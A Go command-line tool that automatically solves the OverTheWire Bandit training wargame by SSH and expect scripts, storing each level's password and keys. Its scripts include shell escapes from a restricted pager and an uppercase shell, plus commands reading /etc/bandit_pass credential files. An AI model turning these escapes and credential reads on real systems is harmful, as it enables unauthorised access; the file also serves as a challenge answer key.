package main

import (
	"bytes"
	"errors"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"

	"github.com/pelletier/go-toml/v2"
)

const (
	defaultHost = "bandit.labs.overthewire.org"
	defaultPort = "2220"
)

type config struct {
	Connection connectionConfig `toml:"connection"`
	Bootstrap  bootstrapConfig  `toml:"bootstrap"`
	Steps      []map[string]any `toml:"steps"`
}

type connectionConfig struct {
	Host string `toml:"host"`
	Port int    `toml:"port"`
}

type bootstrapConfig struct {
	Level    int    `toml:"level"`
	Password string `toml:"password"`
}

type app struct {
	host       string
	port       string
	repoRoot   string
	configPath string
	passFile   string
	keyDir     string
}

var (
	passwordPattern   = regexp.MustCompile(`[A-Za-z0-9]{32}`)
	privateKeyPattern = regexp.MustCompile(`(?s)-----BEGIN [A-Z ]*PRIVATE KEY-----.*?-----END [A-Z ]*PRIVATE KEY-----`)
	ansiPatterns      = []*regexp.Regexp{
		regexp.MustCompile(`\x1b\[[0-?]*[ -/]*[@-~]`),
		regexp.MustCompile(`(?s)\x1bP.*?\x1b\\`),
		regexp.MustCompile(`(?s)\x1b\].*?(?:\x07|\x1b\\)`),
		regexp.MustCompile(`\x1b.`),
	}
)

func main() {
	if err := runMain(os.Args[1:]); err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
}

func runMain(args []string) error {
	repoRoot, err := findRepoRoot()
	if err != nil {
		return err
	}

	defaultConfig := filepath.Join(repoRoot, "levels", "bandit-levels.toml")
	configPath := getenv("BANDIT_LEVELS_FILE", defaultConfig)
	refresh := false
	show := false
	sshLevel := -1

	flags := flag.NewFlagSet("bandit-helper", flag.ContinueOnError)
	flags.SetOutput(os.Stderr)
	flags.StringVar(&configPath, "config", configPath, "level config file")
	flags.BoolVar(&refresh, "refresh", false, "solve bandit0 through bandit33")
	flags.BoolVar(&show, "show", false, "print saved passwords")
	flags.IntVar(&sshLevel, "ssh", -1, "SSH into banditLEVEL")
	if err := flags.Parse(args); err != nil {
		return err
	}

	helper := &app{
		host:       defaultHost,
		port:       defaultPort,
		repoRoot:   repoRoot,
		configPath: configPath,
		passFile:   filepath.Join(repoRoot, "bandit-passwords.txt"),
		keyDir:     filepath.Join(repoRoot, ".bandit-keys"),
	}

	cfg, err := helper.loadConfig()
	if err != nil {
		return err
	}
	helper.applyConnection(cfg)

	switch {
	case refresh:
		return helper.refresh(cfg)
	case show:
		return helper.showPasswords()
	case sshLevel >= 0:
		return helper.sshLevel(sshLevel)
	default:
		return helper.menu(cfg)
	}
}

func findRepoRoot() (string, error) {
	cwd, err := os.Getwd()
	if err != nil {
		return "", err
	}
	for {
		if _, err := os.Stat(filepath.Join(cwd, "levels", "bandit-levels.toml")); err == nil {
			return cwd, nil
		}
		parent := filepath.Dir(cwd)
		if parent == cwd {
			return "", errors.New("could not find repo root containing levels/bandit-levels.toml")
		}
		cwd = parent
	}
}

func getenv(name, fallback string) string {
	if value := os.Getenv(name); value != "" {
		return value
	}
	return fallback
}

func (a *app) loadConfig() (*config, error) {
	data, err := os.ReadFile(a.configPath)
	if err != nil {
		return nil, fmt.Errorf("read config: %w", err)
	}
	var cfg config
	if err := toml.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("parse config: %w", err)
	}
	if err := validateConfig(&cfg); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func (a *app) applyConnection(cfg *config) {
	a.host = getenv("BANDIT_HOST", cfg.Connection.Host)
	if a.host == "" {
		a.host = defaultHost
	}
	if envPort := os.Getenv("BANDIT_PORT"); envPort != "" {
		a.port = envPort
	} else if cfg.Connection.Port != 0 {
		a.port = strconv.Itoa(cfg.Connection.Port)
	} else {
		a.port = defaultPort
	}
}

func validateConfig(cfg *config) error {
	if cfg.Bootstrap.Password == "" {
		return errors.New("config bootstrap password is empty")
	}
	if len(cfg.Steps) == 0 {
		return errors.New("config has no steps")
	}

	required := map[string][]string{
		"ssh_command":          {"from", "to", "command"},
		"path_then_command":    {"from", "to", "find_command", "command"},
		"private_key_then_ssh": {"from", "to", "key_command", "key_name", "next_user", "next_command"},
		"bandit26_escape":      {"from", "to", "key_command", "key_name"},
		"git_read_file":        {"from", "to", "git_user", "repo", "file"},
		"git_show":             {"from", "to", "git_user", "repo", "object"},
		"git_push_file":        {"from", "to", "git_user", "repo", "file", "content", "commit_message"},
		"uppercase_shell":      {"from", "to"},
	}

	for index, step := range cfg.Steps {
		stepType, ok := stringField(step, "type")
		if !ok {
			return fmt.Errorf("step %d is missing type", index+1)
		}
		fields, ok := required[stepType]
		if !ok {
			return fmt.Errorf("step %d has unsupported type %q", index+1, stepType)
		}
		for _, field := range fields {
			if _, ok := step[field]; !ok {
				return fmt.Errorf("step %d (%s) is missing %s", index+1, stepType, field)
			}
		}
	}
	return nil
}

func (a *app) ensureState() error {
	if err := os.MkdirAll(a.keyDir, 0o700); err != nil {
		return err
	}
	if err := os.Chmod(a.keyDir, 0o700); err != nil {
		return err
	}
	file, err := os.OpenFile(a.passFile, os.O_CREATE, 0o600)
	if err != nil {
		return err
	}
	if err := file.Close(); err != nil {
		return err
	}
	return os.Chmod(a.passFile, 0o600)
}

func checkDependencies() error {
	for _, command := range []string{"expect", "ssh", "git", "awk", "grep", "mktemp"} {
		if _, err := exec.LookPath(command); err != nil {
			return fmt.Errorf("missing required command: %s", command)
		}
	}
	return nil
}

func commandOutput(name string, args []string, env []string, input string, dir string) (string, error) {
	cmd := exec.Command(name, args...)
	if dir != "" {
		cmd.Dir = dir
	}
	if len(env) > 0 {
		cmd.Env = append(os.Environ(), env...)
	}
	if input != "" {
		cmd.Stdin = strings.NewReader(input)
	}
	var output bytes.Buffer
	cmd.Stdout = &output
	cmd.Stderr = &output
	err := cmd.Run()
	if err != nil {
		return output.String(), err
	}
	return output.String(), nil
}

func runExpect(script string, env []string) (string, error) {
	output, err := commandOutput("expect", nil, env, script, "")
	if err != nil {
		return output, fmt.Errorf("%w\n%s", err, output)
	}
	return output, nil
}

func stripTerminalCodes(text string) string {
	cleaned := text
	for _, pattern := range ansiPatterns {
		cleaned = pattern.ReplaceAllString(cleaned, "")
	}
	return strings.ReplaceAll(cleaned, "\r", "")
}

func extractPasswords(text string) []string {
	return passwordPattern.FindAllString(stripTerminalCodes(text), -1)
}

func extractPassword(text string) (string, error) {
	passwords := extractPasswords(text)
	if len(passwords) == 0 {
		return "", fmt.Errorf("failed to extract a 32-character password from output:\n%s", text)
	}
	return passwords[len(passwords)-1], nil
}

func (a *app) savePassword(user, password string) error {
	if err := a.ensureState(); err != nil {
		return err
	}
	data, err := os.ReadFile(a.passFile)
	if err != nil {
		return err
	}
	lines := []string{}
	for _, line := range strings.Split(string(data), "\n") {
		if line == "" || strings.HasPrefix(line, user+":") {
			continue
		}
		lines = append(lines, line)
	}
	lines = append(lines, fmt.Sprintf("%s: %s", user, password))
	return os.WriteFile(a.passFile, []byte(strings.Join(lines, "\n")+"\n"), 0o600)
}

func (a *app) getSavedPassword(user string) (string, error) {
	data, err := os.ReadFile(a.passFile)
	if err != nil {
		if os.IsNotExist(err) {
			return "", nil
		}
		return "", err
	}
	password := ""
	prefix := user + ": "
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, prefix) {
			password = strings.TrimPrefix(line, prefix)
		}
	}
	return password, nil
}

func (a *app) recordPassword(level int, password string) error {
	user := fmt.Sprintf("bandit%d", level)
	if level != 0 && !passwordPattern.MatchString(password) {
		return fmt.Errorf("refusing to save invalid password for %s: %s", user, password)
	}
	if err := a.savePassword(user, password); err != nil {
		return err
	}
	fmt.Printf("[+] %-8s %s\n", user, password)
	return nil
}

func (a *app) runPasswordSSHCommand(user, password, commandText string) (string, error) {
	script := `
set timeout 180
spawn -noecho ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE) \
  $env(BANDIT_COMMAND_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  timeout {
    exit 124
  }
  eof {
  }
}
catch wait result
exit [lindex $result 3]
`
	output, err := runExpect(script, []string{
		"BANDIT_HOST_VALUE=" + a.host,
		"BANDIT_PORT_VALUE=" + a.port,
		"BANDIT_USER_VALUE=" + user,
		"BANDIT_PASSWORD_VALUE=" + password,
		"BANDIT_COMMAND_VALUE=" + commandText,
	})
	if err != nil {
		return output, fmt.Errorf("SSH command failed for %s: %s\n%w", user, commandText, err)
	}
	return output, nil
}

func (a *app) runKeySSHCommand(user string, keyFile string, commandText string) (string, error) {
	args := []string{
		"-o", "StrictHostKeyChecking=no",
		"-o", "UserKnownHostsFile=/dev/null",
		"-o", "LogLevel=ERROR",
		"-o", "IdentitiesOnly=yes",
		"-o", "BatchMode=yes",
		"-i", keyFile,
		"-p", a.port,
		user + "@" + a.host,
		commandText,
	}
	output, err := commandOutput("ssh", args, nil, "", "")
	if err != nil {
		return output, fmt.Errorf("%w\n%s", err, output)
	}
	return output, nil
}

func (a *app) solvePassword(user, password, commandText string) (string, error) {
	output, err := a.runPasswordSSHCommand(user, password, commandText)
	if err != nil {
		return "", err
	}
	return extractPassword(output)
}

func (a *app) solvePath(user, password, commandText string) (string, error) {
	output, err := a.runPasswordSSHCommand(user, password, commandText)
	if err != nil {
		return "", err
	}
	lines := strings.Split(stripTerminalCodes(output), "\n")
	for index := len(lines) - 1; index >= 0; index-- {
		if strings.Contains(lines[index], "/inhere/") {
			return lines[index], nil
		}
	}
	return "", fmt.Errorf("failed to extract path from output:\n%s", output)
}

func (a *app) savePrivateKey(name, output string) (string, error) {
	match := privateKeyPattern.FindString(stripTerminalCodes(output))
	if match == "" {
		return "", fmt.Errorf("failed to extract private key %s from output:\n%s", name, output)
	}
	if err := a.ensureState(); err != nil {
		return "", err
	}
	keyFile := filepath.Join(a.keyDir, name)
	if err := os.WriteFile(keyFile, []byte(match+"\n"), 0o600); err != nil {
		return "", err
	}
	return keyFile, os.Chmod(keyFile, 0o600)
}

func (a *app) solveBandit26Pair(keyFile string) (string, string, error) {
	script := `
set timeout 90
set stty_init "rows 5 columns 80"
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o IdentitiesOnly=yes \
  -i $env(BANDIT_KEY_VALUE) \
  -p $env(BANDIT_PORT_VALUE) \
  bandit26@$env(BANDIT_HOST_VALUE)
expect {
  -re "--More--" {
    send -- "v"
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
expect {
  -re "~" {
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
after 500
send -- "\033:set shell=/bin/bash\r"
after 500
send -- ":shell\r"
after 500
send -- "cat /etc/bandit_pass/bandit26; ./bandit27-do cat /etc/bandit_pass/bandit27; exit\r"
set password_count 0
expect {
  -re {[[:alnum:]]{32}} {
    incr password_count
    if {$password_count < 2} {
      exp_continue
    }
  }
  timeout {
    exit 124
  }
  eof {
    exit 1
  }
}
close
wait
exit 0
`
	output, err := runExpect(script, []string{
		"BANDIT_HOST_VALUE=" + a.host,
		"BANDIT_PORT_VALUE=" + a.port,
		"BANDIT_KEY_VALUE=" + keyFile,
	})
	if err != nil {
		return "", "", err
	}
	passwords := extractPasswords(output)
	if len(passwords) < 2 {
		return "", "", fmt.Errorf("expected two passwords from bandit26 output:\n%s", output)
	}
	return passwords[len(passwords)-2], passwords[len(passwords)-1], nil
}

func (a *app) solveUppercaseShell(password string) (string, error) {
	script := `
set timeout 60
spawn -noecho ssh \
  -tt \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -o NumberOfPasswordPrompts=1 \
  -p $env(BANDIT_PORT_VALUE) \
  bandit32@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    exp_continue
  }
  -re "WELCOME TO THE UPPERCASE SHELL|>>" {
  }
  timeout {
    exit 124
  }
}
after 500
send -- "\$0\r"
expect {
  -re {[$#] } {
  }
  timeout {
    exit 124
  }
}
send -- "cat /etc/bandit_pass/bandit33; exit\r"
expect {
  -re {[[:alnum:]]{32}} {
  }
  timeout {
    exit 124
  }
}
close
wait
exit 0
`
	output, err := runExpect(script, []string{
		"BANDIT_HOST_VALUE=" + a.host,
		"BANDIT_PORT_VALUE=" + a.port,
		"BANDIT_PASSWORD_VALUE=" + password,
	})
	if err != nil {
		return "", err
	}
	return extractPassword(output)
}

func (a *app) gitEnv(password, askpass string) []string {
	sshCommand := "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o PubkeyAuthentication=no -o PreferredAuthentications=password -o NumberOfPasswordPrompts=1"
	display := getenv("DISPLAY", ":0")
	return []string{
		"BANDIT_GIT_PASSWORD=" + password,
		"GIT_SSH_COMMAND=" + sshCommand,
		"SSH_ASKPASS=" + askpass,
		"SSH_ASKPASS_REQUIRE=force",
		"DISPLAY=" + display,
	}
}

func writeAskpass(dir string) (string, error) {
	askpass := filepath.Join(dir, "askpass.sh")
	content := "#!/usr/bin/env bash\nprintf '%s\\n' \"$BANDIT_GIT_PASSWORD\"\n"
	if err := os.WriteFile(askpass, []byte(content), 0o700); err != nil {
		return "", err
	}
	return askpass, os.Chmod(askpass, 0o700)
}

func (a *app) gitCloneRepo(user, password, remotePath, destination string) error {
	tmp, err := os.MkdirTemp("", "bandit-git-askpass.")
	if err != nil {
		return err
	}
	defer os.RemoveAll(tmp)
	askpass, err := writeAskpass(tmp)
	if err != nil {
		return err
	}
	remote := fmt.Sprintf("ssh://%s@%s:%s%s", user, a.host, a.port, remotePath)
	output, err := commandOutput("git", []string{"clone", remote, destination}, a.gitEnv(password, askpass), "", "")
	if err != nil {
		return fmt.Errorf("%w\n%s", err, output)
	}
	return nil
}

func (a *app) gitPushWithPassword(password, repo string) (string, error) {
	tmp, err := os.MkdirTemp("", "bandit-git-askpass.")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tmp)
	askpass, err := writeAskpass(tmp)
	if err != nil {
		return "", err
	}
	output, err := commandOutput("git", []string{"-C", repo, "push", "origin", "master"}, a.gitEnv(password, askpass), "", "")
	return output, err
}

func renderTemplate(template string, values map[string]string) string {
	rendered := template
	for key, value := range values {
		rendered = strings.ReplaceAll(rendered, "{"+key+"}", value)
	}
	return rendered
}

func stepContext(level int, password string, toLevel int) map[string]string {
	return map[string]string{
		"password":    password,
		"level":       strconv.Itoa(level),
		"to":          strconv.Itoa(toLevel),
		"random_port": strconv.Itoa(20000 + rand.Intn(10000)),
		"temp_output": fmt.Sprintf("/tmp/bandit%dpass.%d.%d", toLevel, os.Getpid(), 1000+rand.Intn(9000)),
	}
}

func (a *app) refresh(cfg *config) error {
	if err := checkDependencies(); err != nil {
		return err
	}
	if err := a.ensureState(); err != nil {
		return err
	}

	fmt.Printf("Refreshing Bandit passwords via %s:%s\n", a.host, a.port)
	fmt.Printf("Level config:  %s\n", a.configPath)
	fmt.Printf("Password file: %s\n", a.passFile)
	fmt.Printf("Key cache:     %s\n\n", a.keyDir)

	passwords := map[int]string{cfg.Bootstrap.Level: cfg.Bootstrap.Password}
	if err := a.recordPassword(cfg.Bootstrap.Level, cfg.Bootstrap.Password); err != nil {
		return err
	}

	for _, step := range cfg.Steps {
		if err := a.solveStep(step, passwords); err != nil {
			return err
		}
	}

	fmt.Println()
	fmt.Println("Refresh complete.")
	return nil
}

func (a *app) solveStep(step map[string]any, passwords map[int]string) error {
	stepType := mustString(step, "type")
	fromLevel := mustInt(step, "from")
	fromUser := fieldString(step, "user", fmt.Sprintf("bandit%d", fromLevel))
	fromPassword, ok := passwords[fromLevel]
	if !ok {
		return fmt.Errorf("missing password for bandit%d", fromLevel)
	}

	switch stepType {
	case "ssh_command":
		toLevel := mustToSingle(step)
		context := stepContext(fromLevel, fromPassword, toLevel)
		command := renderTemplate(mustString(step, "command"), context)
		password, err := a.solvePassword(fromUser, fromPassword, command)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "path_then_command":
		toLevel := mustToSingle(step)
		context := stepContext(fromLevel, fromPassword, toLevel)
		findCommand := renderTemplate(mustString(step, "find_command"), context)
		path, err := a.solvePath(fromUser, fromPassword, findCommand)
		if err != nil {
			return err
		}
		context["path"] = path
		command := renderTemplate(mustString(step, "command"), context)
		password, err := a.solvePassword(fromUser, fromPassword, command)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "private_key_then_ssh":
		toLevel := mustToSingle(step)
		context := stepContext(fromLevel, fromPassword, toLevel)
		keyCommand := renderTemplate(mustString(step, "key_command"), context)
		output, err := a.runPasswordSSHCommand(fromUser, fromPassword, keyCommand)
		if err != nil {
			return err
		}
		keyFile, err := a.savePrivateKey(mustString(step, "key_name"), output)
		if err != nil {
			return err
		}
		nextCommand := renderTemplate(mustString(step, "next_command"), context)
		keyOutput, err := a.runKeySSHCommand(mustString(step, "next_user"), keyFile, nextCommand)
		if err != nil {
			return err
		}
		password, err := extractPassword(keyOutput)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "bandit26_escape":
		targets := mustToList(step)
		context := stepContext(fromLevel, fromPassword, targets[len(targets)-1])
		keyCommand := renderTemplate(mustString(step, "key_command"), context)
		output, err := a.runPasswordSSHCommand(fromUser, fromPassword, keyCommand)
		if err != nil {
			return err
		}
		keyFile, err := a.savePrivateKey(mustString(step, "key_name"), output)
		if err != nil {
			return err
		}
		first, second, err := a.solveBandit26Pair(keyFile)
		if err != nil {
			return err
		}
		solved := []string{first, second}
		if len(targets) != len(solved) {
			return fmt.Errorf("bandit26_escape expected %d targets, got %d passwords", len(targets), len(solved))
		}
		for index, target := range targets {
			passwords[target] = solved[index]
			if err := a.recordPassword(target, solved[index]); err != nil {
				return err
			}
		}
		return nil
	case "git_read_file":
		toLevel := mustToSingle(step)
		tmp, err := os.MkdirTemp("", "bandit-repo.")
		if err != nil {
			return err
		}
		defer os.RemoveAll(tmp)
		repo := filepath.Join(tmp, "repo")
		if err := a.gitCloneRepo(mustString(step, "git_user"), fromPassword, mustString(step, "repo"), repo); err != nil {
			return err
		}
		data, err := os.ReadFile(filepath.Join(repo, mustString(step, "file")))
		if err != nil {
			return err
		}
		password, err := extractPassword(string(data))
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "git_show":
		toLevel := mustToSingle(step)
		tmp, err := os.MkdirTemp("", "bandit-repo.")
		if err != nil {
			return err
		}
		defer os.RemoveAll(tmp)
		repo := filepath.Join(tmp, "repo")
		if err := a.gitCloneRepo(mustString(step, "git_user"), fromPassword, mustString(step, "repo"), repo); err != nil {
			return err
		}
		output, err := commandOutput("git", []string{"-C", repo, "show", mustString(step, "object")}, nil, "", "")
		if err != nil {
			return fmt.Errorf("%w\n%s", err, output)
		}
		password, err := extractPassword(output)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "git_push_file":
		toLevel := mustToSingle(step)
		tmp, err := os.MkdirTemp("", "bandit-repo.")
		if err != nil {
			return err
		}
		defer os.RemoveAll(tmp)
		repo := filepath.Join(tmp, "repo")
		if err := a.gitCloneRepo(mustString(step, "git_user"), fromPassword, mustString(step, "repo"), repo); err != nil {
			return err
		}
		if output, err := commandOutput("git", []string{"-C", repo, "config", "user.email", "bandit-solver@example.invalid"}, nil, "", ""); err != nil {
			return fmt.Errorf("%w\n%s", err, output)
		}
		if output, err := commandOutput("git", []string{"-C", repo, "config", "user.name", "bandit-solver"}, nil, "", ""); err != nil {
			return fmt.Errorf("%w\n%s", err, output)
		}
		if err := os.WriteFile(filepath.Join(repo, mustString(step, "file")), []byte(mustString(step, "content")), 0o644); err != nil {
			return err
		}
		if output, err := commandOutput("git", []string{"-C", repo, "add", "-f", mustString(step, "file")}, nil, "", ""); err != nil {
			return fmt.Errorf("%w\n%s", err, output)
		}
		if output, err := commandOutput("git", []string{"-C", repo, "commit", "-m", mustString(step, "commit_message")}, nil, "", ""); err != nil {
			return fmt.Errorf("%w\n%s", err, output)
		}
		output, _ := a.gitPushWithPassword(fromPassword, repo)
		password, err := extractPassword(output)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	case "uppercase_shell":
		toLevel := mustToSingle(step)
		password, err := a.solveUppercaseShell(fromPassword)
		if err != nil {
			return err
		}
		passwords[toLevel] = password
		return a.recordPassword(toLevel, password)
	default:
		return fmt.Errorf("unsupported step type: %s", stepType)
	}
}

func (a *app) showPasswords() error {
	if err := a.ensureState(); err != nil {
		return err
	}
	data, err := os.ReadFile(a.passFile)
	if err != nil {
		return err
	}
	if len(data) == 0 {
		fmt.Println("No passwords saved yet.")
		return nil
	}
	fmt.Print(string(data))
	return nil
}

func (a *app) sshLevel(level int) error {
	if err := a.ensureState(); err != nil {
		return err
	}
	user := fmt.Sprintf("bandit%d", level)
	password, err := a.getSavedPassword(user)
	if err != nil {
		return err
	}
	if password == "" {
		cmd := exec.Command("ssh", user+"@"+a.host, "-p", a.port)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		return cmd.Run()
	}
	script := `
set timeout 30
spawn ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o LogLevel=ERROR \
  -o PubkeyAuthentication=no \
  -o PreferredAuthentications=password \
  -p $env(BANDIT_PORT_VALUE) \
  $env(BANDIT_USER_VALUE)@$env(BANDIT_HOST_VALUE)
expect {
  "*password:" {
    send -- "$env(BANDIT_PASSWORD_VALUE)\r"
    interact
  }
  timeout {
    interact
  }
  eof {
  }
}
`
	cmd := exec.Command("expect")
	cmd.Env = append(os.Environ(),
		"BANDIT_HOST_VALUE="+a.host,
		"BANDIT_PORT_VALUE="+a.port,
		"BANDIT_USER_VALUE="+user,
		"BANDIT_PASSWORD_VALUE="+password,
	)
	cmd.Stdin = strings.NewReader(script)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	return cmd.Run()
}

func (a *app) savePasswordInteractive() error {
	reader := os.Stdin
	fmt.Print("Save password for which user? Example: bandit6: ")
	username, err := readLine(reader)
	if err != nil {
		return err
	}
	fmt.Print("Password: ")
	password, err := readLine(reader)
	if err != nil {
		return err
	}
	if err := a.savePassword(strings.TrimSpace(username), strings.TrimSpace(password)); err != nil {
		return err
	}
	fmt.Printf("Saved password for %s.\n", strings.TrimSpace(username))
	return nil
}

func (a *app) menu(cfg *config) error {
	if err := a.ensureState(); err != nil {
		return err
	}
	for {
		fmt.Println("====================================")
		fmt.Println("        OverTheWire Bandit App")
		fmt.Println("====================================")
		fmt.Println()
		fmt.Printf("Password file: %s\n", a.passFile)
		fmt.Printf("Key cache:     %s\n", a.keyDir)
		fmt.Println()
		fmt.Println("1) SSH into a Bandit level")
		fmt.Println("2) Refresh all passwords")
		fmt.Println("3) Save/update a password")
		fmt.Println("4) Show saved passwords")
		fmt.Println("5) Exit")
		fmt.Println()
		fmt.Print("Choose an option: ")

		choice, err := readLine(os.Stdin)
		if err != nil {
			return err
		}
		switch strings.TrimSpace(choice) {
		case "1":
			fmt.Print("Bandit level number, e.g. 0, 1, 26, 33: ")
			rawLevel, err := readLine(os.Stdin)
			if err != nil {
				return err
			}
			level, err := strconv.Atoi(strings.TrimSpace(rawLevel))
			if err != nil {
				return err
			}
			if err := a.sshLevel(level); err != nil {
				return err
			}
		case "2":
			if err := a.refresh(cfg); err != nil {
				return err
			}
			fmt.Print("Press Enter to continue...")
			_, _ = readLine(os.Stdin)
		case "3":
			if err := a.savePasswordInteractive(); err != nil {
				return err
			}
		case "4":
			if err := a.showPasswords(); err != nil {
				return err
			}
			fmt.Print("Press Enter to continue...")
			_, _ = readLine(os.Stdin)
		case "5":
			return nil
		default:
			fmt.Println("Invalid option.")
		}
	}
}

func readLine(reader io.Reader) (string, error) {
	var buffer bytes.Buffer
	tmp := make([]byte, 1)
	for {
		n, err := reader.Read(tmp)
		if n > 0 {
			if tmp[0] == '\n' {
				return buffer.String(), nil
			}
			buffer.WriteByte(tmp[0])
		}
		if err != nil {
			if errors.Is(err, io.EOF) && buffer.Len() > 0 {
				return buffer.String(), nil
			}
			return "", err
		}
	}
}

func stringField(step map[string]any, key string) (string, bool) {
	value, ok := step[key]
	if !ok {
		return "", false
	}
	text, ok := value.(string)
	return text, ok
}

func fieldString(step map[string]any, key, fallback string) string {
	if value, ok := stringField(step, key); ok {
		return value
	}
	return fallback
}

func mustString(step map[string]any, key string) string {
	value, ok := stringField(step, key)
	if !ok {
		panic(fmt.Sprintf("missing string field %s", key))
	}
	return value
}

func mustInt(step map[string]any, key string) int {
	value, ok := step[key]
	if !ok {
		panic(fmt.Sprintf("missing int field %s", key))
	}
	switch typed := value.(type) {
	case int64:
		return int(typed)
	case int:
		return typed
	case float64:
		return int(typed)
	default:
		panic(fmt.Sprintf("field %s is not int", key))
	}
}

func mustToSingle(step map[string]any) int {
	targets := mustToList(step)
	if len(targets) != 1 {
		panic("expected single target")
	}
	return targets[0]
}

func mustToList(step map[string]any) []int {
	value, ok := step["to"]
	if !ok {
		panic("missing to field")
	}
	switch typed := value.(type) {
	case int64:
		return []int{int(typed)}
	case int:
		return []int{typed}
	case float64:
		return []int{int(typed)}
	case []int64:
		targets := make([]int, 0, len(typed))
		for _, target := range typed {
			targets = append(targets, int(target))
		}
		return targets
	case []any:
		targets := make([]int, 0, len(typed))
		for _, target := range typed {
			switch typedTarget := target.(type) {
			case int64:
				targets = append(targets, int(typedTarget))
			case int:
				targets = append(targets, typedTarget)
			case float64:
				targets = append(targets, int(typedTarget))
			default:
				panic("to array contains non-int")
			}
		}
		return targets
	default:
		panic("to field has unsupported type")
	}
}
